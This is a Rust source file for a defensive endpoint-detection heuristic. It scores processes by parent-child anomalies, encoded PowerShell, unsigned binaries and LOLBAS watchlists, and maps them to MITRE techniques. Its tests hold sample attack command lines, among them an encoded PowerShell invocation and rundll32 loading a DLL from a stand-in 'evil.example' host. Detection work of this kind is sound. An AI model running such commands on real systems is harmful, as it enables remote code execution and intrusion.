//! heur_parentchild (FR10, SRS §10): anomalous parent->child, encoded PowerShell,
//! suspicious exec path, unsigned + integrity weighting, built-in LOLBAS-flavored list.
use crate::score::{is_suspicious_path, severity_for, Score};
use cairn_core::finding::EntityProcess;
use cairn_core::record::{ProcessRecord, Record};
use cairn_core::traits::Analyzer;
use cairn_core::{Entity, Finding, FindingSource, Result};
use std::collections::HashMap;

// --- Named rule tables (config-loader seam; see spec) -------------------------

// NOTE: these tables match on the lowercased file NAME only. A renamed binary evades
// them; hash/signer-based enrichment is a future signal (the is_suspicious_path signal
// gives partial path-based coverage in the meantime).
/// Parent images whose spawning of a shell is anomalous (Office apps).
pub(crate) const OFFICE_PARENTS: &[&str] =
    &["winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe"];
/// Script-host parents.
pub(crate) const SCRIPT_PARENTS: &[&str] = &["wscript.exe", "cscript.exe", "mshta.exe"];
/// Shell/child images that are suspicious when spawned by the above.
pub(crate) const SHELL_CHILDREN: &[&str] = &[
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
];
/// PowerShell binaries (for the `-e ` disambiguation).
pub(crate) const PS_BINARIES: &[&str] = &["powershell.exe", "pwsh.exe"];
/// Built-in LOLBAS-flavored watchlist (NOT the full external dataset; see spec scope).
pub(crate) const LOLBAS_WATCH: &[&str] = &[
    "rundll32.exe",
    "regsvr32.exe",
    "mshta.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "cscript.exe",
    "wscript.exe",
];

/// Lowercased file name (last path segment) of an image path.
pub(crate) fn file_name(image: &str) -> String {
    image
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(image)
        .to_ascii_lowercase()
}

/// True if cmdline shows an encoded-command flag with a base64-looking token.
/// `-e ` only counts when the image is a PowerShell binary (avoids unrelated -e flags).
pub(crate) fn has_encoded_powershell(image_name: &str, cmdline: &str) -> bool {
    let lc = cmdline.to_ascii_lowercase();
    // `-enc` already subsumes `-encodedcommand` (substring); `-e ` is the short form,
    // gated to PowerShell binaries so unrelated `-e ` flags on other tools don't match.
    let flag = lc.contains("-enc") || (lc.contains("-e ") && PS_BINARIES.contains(&image_name));
    flag && has_base64_token(cmdline)
}

/// A run of >= 16 chars from the base64 alphabet.
pub(crate) fn has_base64_token(s: &str) -> bool {
    let mut run = 0usize;
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=' {
            run += 1;
            if run >= 16 {
                return true;
            }
        } else {
            run = 0;
        }
    }
    false
}

/// Score one process against its (optional) parent. Returns a Score (may be empty).
pub(crate) fn score_process(p: &ProcessRecord, parent: Option<&ProcessRecord>) -> Score {
    let mut s = Score::default();
    let child_name = file_name(&p.image);
    let parent_name = parent.map(|pp| file_name(&pp.image));

    if let Some(pn) = &parent_name {
        if OFFICE_PARENTS.contains(&pn.as_str()) && SHELL_CHILDREN.contains(&child_name.as_str()) {
            s.add(
                50,
                format!("Office app {pn} spawned shell {child_name}"),
                &["T1059"],
            );
        }
        // Intentionally only the real shells (not other script hosts): a script host
        // launching cmd/powershell is the suspicious pattern; wscript<->cscript chains
        // are commonly benign.
        if SCRIPT_PARENTS.contains(&pn.as_str())
            && ["cmd.exe", "powershell.exe", "pwsh.exe"].contains(&child_name.as_str())
        {
            s.add(
                30,
                format!("script host {pn} spawned {child_name}"),
                &["T1059"],
            );
        }
    }
    if has_encoded_powershell(&child_name, &p.cmdline) {
        s.add(40, "encoded PowerShell command", &["T1059.001"]);
    }
    if is_suspicious_path(&p.image) {
        s.add(
            25,
            format!("executes from a suspicious path: {}", p.image),
            &["T1036"],
        );
    }
    if p.signed == Some(false) {
        s.add(20, "binary is unsigned", &[]);
    }
    if p.signed == Some(false) && matches!(p.integrity.as_deref(), Some("high") | Some("system")) {
        s.add(15, "unsigned binary running at high integrity", &["T1068"]);
    }
    if LOLBAS_WATCH.contains(&child_name.as_str()) && lolbas_suspicious(&p.cmdline) {
        s.add(
            30,
            format!("LOLBAS {child_name} with suspicious arguments"),
            &["T1218"],
        );
    }
    s
}

/// Suspicious argument patterns for a watchlisted LOLBAS binary.
pub(crate) fn lolbas_suspicious(cmdline: &str) -> bool {
    let lc = cmdline.to_ascii_lowercase();
    lc.contains("http") || lc.contains("scrobj") || lc.contains("/i:") || has_base64_token(cmdline)
}

/// Analyzer: scores every process against its parent and emits findings above the floor.
pub struct ParentChildHeuristic;

impl Analyzer for ParentChildHeuristic {
    fn name(&self) -> &str {
        "heur_parentchild"
    }

    fn analyze(&self, records: &[Record]) -> Result<Vec<Finding>> {
        // Index processes by pid for parent lookup.
        let by_pid: HashMap<u32, &ProcessRecord> = records
            .iter()
            .filter_map(|r| match r {
                Record::Process(p) => Some((p.pid, p)),
                _ => None,
            })
            .collect();

        let mut out = Vec::new();
        for r in records {
            let Record::Process(p) = r else { continue };
            let parent = by_pid.get(&p.ppid).copied();
            let score = score_process(p, parent);
            let Some(severity) = severity_for(score.weight) else {
                continue;
            };

            let mut f = Finding::new(severity, suspicious_title(p), FindingSource::Heuristic);
            f.reason = Some(score.reasons.join("; "));
            f.mitre = score.mitre;
            f.artifact = "process".into();
            f.details = format!(
                "pid={} ppid={} image={} cmdline={}",
                p.pid, p.ppid, p.image, p.cmdline
            );
            f.ts = p.start_time.unwrap_or_else(chrono::Utc::now);
            f.entity = Entity {
                process: Some(EntityProcess {
                    pid: p.pid,
                    ppid: p.ppid,
                    image: p.image.clone(),
                    cmdline: p.cmdline.clone(),
                    signed: p.signed,
                    integrity: p.integrity.clone(),
                }),
                ..Entity::default()
            };
            out.push(f);
        }
        Ok(out)
    }
}

/// A short title for a flagged process.
fn suspicious_title(p: &ProcessRecord) -> String {
    let name = file_name(&p.image);
    format!("Suspicious process: {name}")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn proc(pid: u32, ppid: u32, image: &str, cmdline: &str) -> ProcessRecord {
        ProcessRecord {
            pid,
            ppid,
            image: image.into(),
            cmdline: cmdline.into(),
            signed: None,
            integrity: None,
            user: None,
            start_time: None,
        }
    }

    /// Office -> encoded PowerShell scores high+ and tags T1059.001.
    #[test]
    fn office_encoded_powershell_scores_high() {
        let parent = proc(100, 4, r"C:\Program Files\Microsoft Office\winword.exe", "");
        let child = proc(
            200,
            100,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        );
        let s = score_process(&child, Some(&parent));
        assert!(s.weight >= 50, "weight {} should be high+", s.weight);
        assert!(s.mitre.contains(&"T1059.001".to_string()));
        assert!(s.reasons.iter().any(|r| r.contains("winword.exe")));
    }

    /// A benign explorer -> notepad (signed, normal path) scores 0.
    #[test]
    fn benign_explorer_notepad_scores_zero() {
        let parent = proc(50, 4, r"C:\Windows\explorer.exe", "");
        let mut child = proc(60, 50, r"C:\Windows\System32\notepad.exe", "notepad.exe");
        child.signed = Some(true);
        let s = score_process(&child, Some(&parent));
        assert_eq!(s.weight, 0);
    }

    /// Unsigned binary from Temp still scores even with NO parent (self-signals only).
    #[test]
    fn unsigned_from_temp_no_parent_scores() {
        let mut p = proc(70, 0, r"C:\Users\a\AppData\Local\Temp\evil.exe", "evil.exe");
        p.signed = Some(false);
        let s = score_process(&p, None);
        // suspicious path (25) + unsigned (20) = 45 -> at least medium, no panic
        assert!(s.weight >= 45);
    }

    /// A watchlisted LOLBAS binary with a suspicious http argument scores the LOLBAS
    /// signal (+30, T1218); the same binary with a benign argument does not.
    #[test]
    fn lolbas_http_arg_fires_benign_does_not() {
        let bad = proc(
            300,
            4,
            r"C:\Windows\System32\rundll32.exe",
            "rundll32.exe http://evil.example/x.dll,Entry",
        );
        let s = score_process(&bad, None);
        assert!(s.mitre.contains(&"T1218".to_string()));
        assert!(s.weight >= 30);

        let benign = proc(
            301,
            4,
            r"C:\Windows\System32\rundll32.exe",
            "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
        );
        let s2 = score_process(&benign, None);
        assert!(
            !s2.mitre.contains(&"T1218".to_string()),
            "benign rundll32 must not fire the LOLBAS signal"
        );
    }

    /// The `-e ` short form only counts for PowerShell binaries: a non-PS tool with
    /// `-e <base64>` must NOT fire the encoded-PowerShell signal.
    #[test]
    fn dash_e_short_form_only_for_powershell() {
        // non-PS binary with -e <base64-looking>: must NOT fire encoded-PS
        let other = proc(
            400,
            4,
            r"C:\tools\curl.exe",
            "curl.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA https://x",
        );
        let s = score_process(&other, None);
        assert!(
            !s.mitre.contains(&"T1059.001".to_string()),
            "-e on a non-PS binary must not be treated as encoded PowerShell"
        );

        // powershell with -e <base64>: DOES fire
        let ps = proc(
            401,
            4,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        );
        let s2 = score_process(&ps, None);
        assert!(s2.mitre.contains(&"T1059.001".to_string()));
    }

    use cairn_core::record::Record;
    use cairn_core::traits::Analyzer;

    fn rec(p: ProcessRecord) -> Record {
        Record::Process(p)
    }

    /// The analyzer emits one Heuristic finding (with reason + entity) for a malicious
    /// Office->encoded-PS pair, and nothing for a benign process.
    #[test]
    fn analyzer_emits_finding_for_malicious_pair_only() {
        let parent = proc(100, 4, r"C:\...\winword.exe", "");
        let child = proc(
            200,
            100,
            r"C:\...\powershell.exe",
            "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        );
        let mut benign = proc(60, 50, r"C:\Windows\System32\notepad.exe", "notepad.exe");
        benign.signed = Some(true);
        let recs = vec![rec(parent), rec(child), rec(benign)];

        let findings = ParentChildHeuristic.analyze(&recs).expect("analyze");
        assert_eq!(findings.len(), 1, "only the malicious child should fire");
        let f = &findings[0];
        assert!(matches!(f.source, cairn_core::FindingSource::Heuristic));
        assert!(f.reason.is_some(), "golden rule 6: reason required");
        assert!(f.entity.process.is_some());
        assert!(f.mitre.contains(&"T1059.001".to_string()));
    }
}
